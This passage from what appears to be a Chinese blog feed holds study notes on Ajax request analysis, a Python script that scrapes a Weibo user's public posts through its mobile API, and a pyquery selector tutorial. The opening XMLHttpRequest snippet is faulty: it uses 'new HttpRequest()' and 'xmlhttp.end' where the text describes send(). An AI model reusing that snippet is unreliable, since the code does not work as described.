    <content><![CDATA[<h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><h2 id="什么是Ajax"><a href="#什么是Ajax" class="headerlink" title="什么是Ajax"></a>什么是Ajax</h2><p>全称是Asynchronous JavaScript and XML,即异步的JavaScript和XML。利用了JavaScript在保证页面不被刷新，页面链接不改变的情况下与服务器交换数据并更新部分网页的技术<br><a href="https://www.w3school.com.cn/ajax/ajax_xmlhttprequest_send.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/ajax/ajax_xmlhttprequest_send.asp</a></p>
<h3 id="实例引入"><a href="#实例引入" class="headerlink" title="实例引入"></a>实例引入</h3><p>访问<a href="https://m.weibo.cn/u/2830678474" target="_blank" rel="noopener">https://m.weibo.cn/u/2830678474</a><br><img src="/img/python3/ajax0.png" alt="avatar"></p>
<p>向下滑，滑几个微博之后，就会出现这种加载中的画面，这其实就是Ajax的加载过程</p>
<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>分为3个步骤：<br>1）发送请求<br>2）解析内容<br>3）渲染网页</p>
<p>JavaScript可以实现页面的各种交互功能，Ajax也不例外，它也是由JavaScript来实现的<br>执行了如下代码：<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">var xmlhttp;</span><br><span class="line"><span class="keyword">if</span>(window.XMLHttpRequest)&#123;</span><br><span class="line">	<span class="attribute">xmlhttp</span>=new HttpRequest();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="attribute">xmlhttp</span>=new ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xmlhttp.<span class="attribute">onreadystatechange</span>=function()&#123;</span><br><span class="line">	<span class="keyword">if</span>(xmlhttp.<span class="attribute">readyState</span>==4&amp;&amp;xmlhttp.status==200)</span><br><span class="line">    document.getElementById(<span class="string">"myDiv"</span>).<span class="attribute">innerHTML</span>=xmlhttp.responseText;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"/ajax/"</span>,<span class="literal">true</span>)</span><br><span class="line">xmlhttp.end</span><br></pre></td></tr></table></figure><br>这是JavaScript对Ajax最底层的实现，实际上就是新建了XMLHttpRequest对象，然后调用onreadystatechange属性设置了监听，然后调用open()和send()方法向某个链接发送了请求。由于设置了监听，所以当服务器返回响应时，onreadystatechange对应的方法便会被触发，然后在这个方法里解析响应内容即可</p>
<h3 id="解析内容"><a href="#解析内容" class="headerlink" title="解析内容"></a>解析内容</h3><p>得到响应之后，onreadystatechange属性对应的方法便会被触发，此时利用xmlhttp的responseText属性便会取到响应内容。这类似于python中利用requests向服务器发起请求，然后得到响应的过程。那么返回内容可能是HTML,也可能是JSON，接下来只需要在方法中用JavaScript进一步处理即可。</p>
<h3 id="渲染网页"><a href="#渲染网页" class="headerlink" title="渲染网页"></a>渲染网页</h3><p>JavaScript有改变网页内容的能力，解析完响应内容之后，就可以调用JavaScript来针对解析完的内容对网页进行下一步处理了。比如，通过document.getElementById().innerHTML这样的操作，便可以对某个元素内的源代码进行更改，这样网页显示的内容就改变了，这样的操作也被称为DOM操作，即对Document网页文档进行操作。</p>
<h2 id="Ajax分析方法"><a href="#Ajax分析方法" class="headerlink" title="Ajax分析方法"></a>Ajax分析方法</h2><p>之前微博的例子，知道拖动刷新的内容由Ajax加载，而且URL没有变化，所以就需要借助开发者工具</p>
<h3 id="查看请求"><a href="#查看请求" class="headerlink" title="查看请求"></a>查看请求</h3><p><img src="/img/python3/ajax1.png" alt="avatar"><br>F12使用开发者工具，查看Elements选项卡中便会观察到网页的源代码，右侧便是节点的样式</p>
<p>接着切换到NetWork选项卡，刷新一下会出现很多条目，Ajax其实有其特殊的请求类型，叫做xhr，我们可以发现一个名称为getIndex开头的请求，其Type为xhr，这就是一个Ajax请求<br><img src="/img/python3/ajax2.png" alt="avatar"><br><img src="/img/python3/ajax3.png" alt="avatar"><br>再点一下Preview<br><img src="/img/python3/ajax4.png" alt="avatar"><br>这里返回的就是个人信息，如名称，简介，头像等，这是用来渲染个人主页所使用的数据<br>再切换到Response选项卡，从中观察到真实的返回数据<br><img src="/img/python3/ajax5.png" alt="avatar"><br>接下来切换到第一个请求，查看它的Response<br><img src="/img/python3/ajax6.png" alt="avatar"><br>发现只有不到50行代码，但是执行了一些JavaScript</p>
<h3 id="过滤请求"><a href="#过滤请求" class="headerlink" title="过滤请求"></a>过滤请求</h3><p>使用开发者工具，筛选出所有的XHR<br><img src="/img/python3/ajax7.png" alt="avatar"><br>这样就可以清楚的看到XHR的URL Headers等内容了</p>
<h2 id="Ajax结果提取"><a href="#Ajax结果提取" class="headerlink" title="Ajax结果提取"></a>Ajax结果提取</h2><p>接下来用python模拟Ajax请求，把发过的微博爬取下来</p>
<h3 id="分析请求"><a href="#分析请求" class="headerlink" title="分析请求"></a>分析请求</h3><p>打开XHR过滤后，然后滑动页面会发现加载新的微博内容，并且不断会有Ajax请求发出</p>
<p>选定一个请求，分析它的参数信息。<br><img src="/img/python3/ajax8.png" alt="avatar"><br>可以看到这是一个GET类型的请求，参数有4个type,value,containerid和page</p>
<p>再看看其他请求，发现这几个参数始终如一。type始终为uid，value就是页面链接中的数字，这其实就是用户的id，containerid它就是107603加上用户id，改变的值就是page，是用来控制分页的</p>
<h3 id="分析响应"><a href="#分析响应" class="headerlink" title="分析响应"></a>分析响应</h3><p><img src="/img/python3/ajax9.png" alt="avatar"><br>这个内容是JSON格式的，开发者工具自动做了解析方便我们查看，可以看到最关键的部分就是cardlistInfo和cards:前者包含一个比较重要的信息total，观察后可以发现，它是微博的总数量；后者则是一个列表，随便展开一个查看<br><img src="/img/python3/ajax10.png" alt="avatar"><br>这里面的mblog比较重要，展开后发现正是微博的一些信息，比如attitudes_count（赞数目），comments_count(评论数目)，reposts_count(转发数目)，created_at(发布时间),text(微博正文)等</p>
<p>这样我们请求一个接口，就可以得到10条微博，请求时只需要改变page参数即可</p>
<h3 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h3><p>我们用Python来模拟这些请求，将他前10页的微博全部爬取下来<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse import  urlencode</span><br><span class="line"><span class="keyword">from</span> pyquery import PyQuery as pq</span><br><span class="line"><span class="attribute">base_url</span>=<span class="string">"https://m.weibo.cn/api/container/getIndex?"</span></span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'Host'</span>:<span class="string">'m.weibo.cn'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>:<span class="string">'https://m.weibo.cn/u/2830678474'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'X-Requested-With'</span>:<span class="string">'XMLHttpRequest'</span></span><br><span class="line">&#125;</span><br><span class="line">max_page = 10</span><br><span class="line"></span><br><span class="line">def get_page(page):</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">'type'</span>:<span class="string">'uid'</span>,</span><br><span class="line">        <span class="string">'value'</span>:<span class="string">'2830678474'</span>,</span><br><span class="line">        <span class="string">'containerid'</span>:<span class="string">'1076032830678474'</span>,</span><br><span class="line">        <span class="string">'page'</span>: page</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">url</span>=base_url+urlencode(params)</span><br><span class="line">    try:</span><br><span class="line">        <span class="attribute">response</span>=requests.get(url,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.<span class="attribute">status_code</span>==200:</span><br><span class="line">            return response.json()</span><br><span class="line">    except requests.ConnectionError as e:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'Error'</span>,e.args)</span><br><span class="line"></span><br><span class="line">def parse_page(json):</span><br><span class="line">    <span class="keyword">if</span> json:</span><br><span class="line">        items = json.<span class="builtin-name">get</span>(<span class="string">'data'</span>).<span class="builtin-name">get</span>(<span class="string">'cards'</span>)</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">            item = item.<span class="builtin-name">get</span>(<span class="string">'mblog'</span>)</span><br><span class="line">            weibo = &#123;&#125;</span><br><span class="line">            weibo[<span class="string">'id'</span>] = item.<span class="builtin-name">get</span>(<span class="string">'id'</span>)</span><br><span class="line">            weibo[<span class="string">'text'</span>] = pq(item.<span class="builtin-name">get</span>(<span class="string">'text'</span>)).text()</span><br><span class="line">            weibo[<span class="string">'attitudes'</span>] = item.<span class="builtin-name">get</span>(<span class="string">'attitudes_count'</span>)</span><br><span class="line">            weibo[<span class="string">'comments'</span>] = item.<span class="builtin-name">get</span>(<span class="string">'comments_count'</span>)</span><br><span class="line">            weibo[<span class="string">'reposts'</span>] = item.<span class="builtin-name">get</span>(<span class="string">'reposts_count'</span>)</span><br><span class="line">            yield weibo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span><span class="built_in"> page </span><span class="keyword">in</span> range(1, max_page + 1):</span><br><span class="line">        json = get_page(page)</span><br><span class="line">        results = parse_page(json)</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">            <span class="builtin-name">print</span>(result)</span><br></pre></td></tr></table></figure></p>
<p>这样就把前10页的微博都爬取下来了</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.首先要判断是否为Ajax,具体方法就是下拉，看是否会有加载新内容，并关注开发中工具中的NetWork选项卡，查看有变化</p>
<p>2.在筛选XHR时，要注意其中的内容和URL变化，如果是靠翻页来更新内容的，就不是Ajax</p>
<p>3.URL变化也是判断是否为Ajax的重要选项，例如微博中的id等参数就没有变化，并且主页代码很少且执行了JS，综合一下就可以判断是否为Ajax</p>
<p>4.目前不一定能爬取到，例如今日头条中的图片，参数设置为了abstract，这样就没有办法爬取到了</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/4/11-pyquery</title>
    <url>/2020/04/11/Python3-2020-4-11-%E5%91%A8%E6%8A%A57/</url>
    <content><![CDATA[<h1 id="pyquery"><a href="#pyquery" class="headerlink" title="pyquery"></a>pyquery</h1><h2 id="基本CSS选择器"><a href="#基本CSS选择器" class="headerlink" title="基本CSS选择器"></a>基本CSS选择器</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">print(doc('#container .list li'))</span><br><span class="line">print(type(doc('#container .list li')))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     </span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">pyquery.pyquery.PyQuery</span>'&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里我们初始化pyquery对象之后，传入了一个CSS选择器#container.list li 它的意思是先选取id为container的节点，然后再选取其内部的class为list的节点内部的所有li节点。然后，打印输出。</p>
<h2 id="查找节点"><a href="#查找节点" class="headerlink" title="查找节点"></a>查找节点</h2><p>pyquery中的查询函数与jquery中函数的用法完全相同</p>
<h3 id="子节点"><a href="#子节点" class="headerlink" title="子节点"></a>子节点</h3><p>查询子节点时，需要用到find()方法，此时传入的参数是CSS选择器<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">items = doc('.list')</span><br><span class="line">print(type(items))</span><br><span class="line">print(items)</span><br><span class="line">lis = items.find('li')</span><br><span class="line">print(type(lis))</span><br><span class="line">print(lis)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">pyquery.pyquery.PyQuery</span>'&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">pyquery.pyquery.PyQuery</span>'&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这里我们先选取class为list节点，然后调用find()方法，传入CSS选择器，选取其内部的li节点，最后打印输出</p>
<p>find()方法会将符合条件的所有节点选择出来</p>
<p>查找范围是节点的所有子孙节点，而如果我们只想查找子节点，那么可以用children()方法</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lis</span>=items.children()</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">type</span>(<span class="keyword">lis</span>))</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">lis</span>)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;<span class="keyword">class</span> 'pyquery.pyquery.PyQuery'&gt;</span><br><span class="line">&lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0"</span>&gt;first item&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">         &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-1"</span>&gt;&lt;a href=<span class="string">"link2.html"</span>&gt;second item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">         &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0 active"</span>&gt;&lt;a href=<span class="string">"link3.html"</span>&gt;&lt;span <span class="keyword">class</span>=<span class="string">"bold"</span>&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">         &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-1 active"</span>&gt;&lt;a href=<span class="string">"link4.html"</span>&gt;fourth item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br><span class="line">         &lt;<span class="keyword">li</span> <span class="keyword">class</span>=<span class="string">"item-0"</span>&gt;&lt;a href=<span class="string">"link5.html"</span>&gt;fifth item&lt;/a&gt;&lt;/<span class="keyword">li</span>&gt;</span><br></pre></td></tr></table></figure>
<p>如果要筛选所有子节点中符合条件的节点，例如筛选出子节点中class为active的节点，可以向children()方法传入CSS选择器.active:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">lis=items.children(<span class="string">'.active'</span>)</span><br><span class="line">print(lis)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-0 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">         &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"item-1 active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h3 id="父节点"><a href="#父节点" class="headerlink" title="父节点"></a>父节点</h3><p>我们可以用parent()方法来获取某个节点的父节点<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrap"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">items = doc('.list')</span><br><span class="line">container = items.parent()</span><br><span class="line">print(type(container))</span><br><span class="line">print(container)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">pyquery.pyquery.PyQuery</span>'&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span 